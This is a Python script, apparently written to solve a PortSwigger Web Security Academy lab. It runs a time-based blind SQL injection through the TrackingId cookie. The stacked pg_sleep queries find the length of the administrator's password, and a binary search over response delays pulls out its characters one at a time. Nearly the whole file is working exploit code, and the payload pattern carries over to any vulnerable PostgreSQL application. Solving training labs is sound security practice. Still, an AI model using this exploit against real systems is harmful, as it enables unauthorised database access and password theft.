import requests
import string
import time

URL="https://0afe00a60472157d81d6fc5d002f00af.web-security-academy.net"
SESSION = "iBuCb1WcbVD76iCNJXsxT7bf7DzjBhvc"
USER = "administrator"
POSSIBLE_CHARACTERS = string.digits + string.ascii_uppercase + string.ascii_lowercase
RESPONSE_TIME = 10

get_password_length_operation = "(select length(password) from users where username='{}')".format(USER)
get_password_operation = "(select password from users where username='{}')".format(USER)


def payload(condition):
	return "x'%3BSELECT+CASE+WHEN+(username='{}'+AND+{})+THEN+pg_sleep({})+ELSE+pg_sleep(0)+END+FROM+users--".format(USER,condition,RESPONSE_TIME)

# returns error when the password length is size
def payload_password_length(size):
	return payload("LENGTH(password)={}".format(size))

# returns error when the password has password[position] fulfills the operation for new_char (for example, password[position] > new_char)
def payload_password(position, new_char, operation):
	return payload("SUBSTRING(password, {}, 1) {} '{}'".format(position,operation,new_char))
	
#returns the character 
def binary_search_char_position(low, high, position):
 	
	if high >= low:

		mid = (high + low) // 2
		
		if requests.get(URL,cookies={"TrackingId":payload_password(position, POSSIBLE_CHARACTERS[mid], '='),"SESSION":SESSION}).elapsed.total_seconds() >= RESPONSE_TIME:
			return POSSIBLE_CHARACTERS[mid]
			
		if requests.get(URL,cookies={"TrackingId":payload_password(position, POSSIBLE_CHARACTERS[mid], '<'),"SESSION":SESSION}).elapsed.total_seconds() >= RESPONSE_TIME:
			return binary_search_char_position(low, mid - 1, position)
		
		if requests.get(URL,cookies={"TrackingId":payload_password(position, POSSIBLE_CHARACTERS[mid], '>'),"SESSION":SESSION}).elapsed.total_seconds() >= RESPONSE_TIME:
			return binary_search_char_position(mid + 1, high, position)
		return -1

	else:
		return -1




# find password length
def findPasswordLength():
	password_length = 0
	elapsed_time = 0
	while elapsed_time < RESPONSE_TIME:
		password_length += 1
		response = requests.get(URL,cookies={"TrackingId":payload_password_length(password_length),"SESSION":SESSION})
		elapsed_time = response.elapsed.total_seconds()
		print("Response time for length(password)={} is {}".format(password_length, elapsed_time))
	return password_length	

# find character at each position
def findPassword():
	password_length = findPasswordLength()
	print("Password length = ", password_length)
	password = ""
	position = 1
	new_character = 0
	while new_character != -1 and len(password) < password_length:
		new_character = binary_search_char_position(0, len(POSSIBLE_CHARACTERS)-1, position)
		password = password + str(new_character)
		print("Password so far: ", password)
		position = position + 1
		
	if len(password)==password_length:
		return password
	else:
		return null

print("Password = ", findPassword())
